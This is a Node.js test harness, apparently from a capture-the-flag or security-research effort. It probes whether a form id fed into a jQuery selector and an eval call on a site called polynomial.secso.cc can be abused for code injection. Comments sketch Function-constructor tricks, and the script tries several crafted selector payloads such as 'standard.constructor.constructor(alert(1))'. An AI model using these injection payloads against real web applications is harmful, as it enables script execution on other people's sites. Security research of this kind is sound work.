const fs = require("fs");
const { JSDOM } = require("jsdom");
const jquerySrc = fs.readFileSync(__dirname + "/node_modules/jquery/dist/jquery.js", "utf8");

function test(format, note) {
  const html = `<!DOCTYPE html><html><body>
  <form id="poly_x" data-formula="x+y">
    <input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2">
    <input name="formula" value="x+y"><div id="template_standard" hidden>t</div>
  </form><pre id="answer"></pre></body></html>`;
  const dom = new JSDOM(html, { runScripts: "dangerously", pretendToBeVisual: true, url:"https://polynomial.secso.cc/" });
  const { window } = dom;
  const s = window.document.createElement("script"); s.textContent = jquerySrc; window.document.head.appendChild(s);
  const $ = window.$;
  const form = window.document.querySelector("form");
  form.id = "poly_" + format;
  const selected = form.id.replace("poly_", "");
  let res = { note, selLen:null, hit:false };
  try {
    const t = $("#template_" + selected);
    res.selLen = t.length;
    if (t.length === 0) {
      window.__HIT__ = false;
      window.type_standard = function(){ return "SAFE"; };
      try {
        window.eval("(function(){ var selected=" + JSON.stringify(selected) + "; " +
                    "return eval('type_'+selected+'(this, selected)'); }).call(document.querySelector('form'))");
        res.hit = !!window.__HIT__;
      } catch(e){ res.evalErr = e.message.split("\n")[0]; }
    } else { res.note += " [SAFE]"; }
  } catch(e){ res.selErr = e.message.split("\n")[0]; }
  return res;
}

// eval = type_<format>(this, selected).  Try to make this run code.
// Strategy A: comma operator inside a pseudo that jQuery tolerates + parens.
//   type_standard.constructor.constructor(this,selected) = Function(form, <bodyString>)
//   If we make `selected` (== format) a valid Function body that sets __HIT__, and then it's CALLED...
//   Function(...)(...) needs trailing (). We can't. BUT .constructor.constructor with a getter?
// Strategy B: Use tag function? backtick invalid in CSS.
// Strategy C: exploit that arg2 `selected` is our whole string; use it as body of Function AND
//   trigger execution via .constructor.constructor(a,b) is NOT auto-run.
// Strategy D: type_standard`...` no.
// Strategy E: Overwrite type_standard so its call runs code -- can't, defined in module.
//
// Realization: (this, selected) is a comma expr -> evaluates to `selected` (our string).
// So type_<format>(this, selected) === type_<format>(form, formatString).
// If type_<format> is a FUNCTION we control the identity of via member access, and it EXECUTES its
// 2nd arg... e.g. eval? setTimeout? Function()() ?
//   - There's no global `eval` reachable as type_standard.<...> easily, but:
//   - type_standard.constructor.constructor("body")  => Function("body")  (needs call)
//   - BUT: type_standard.constructor.constructor(this, selected) => Function(form, selected)
//         returns fn; NOT called.  Need ()().
// Try adding call via pseudo trick: does jQuery accept trailing () after ] or )?
const cands = [
  ["standard.constructor.constructor(alert(1))", "parens not in pseudo -> valid?"],
  ["standard.constructor.constructor.call(this,window.__HIT__=true)", "call() with parens"],
  ["standard[a=`x`]", "attr backtick"],
  ["standard:is(a):is(window.__HIT__=true)", "code inside :is()"],
  ["standard.constructor.constructor(1)(this,selected)", "double call - selector valid?"],
  ["standard['constructor']", "bracket string in selector?"],
];
for (const [c,n] of cands) console.log(JSON.stringify(test(c,n)));
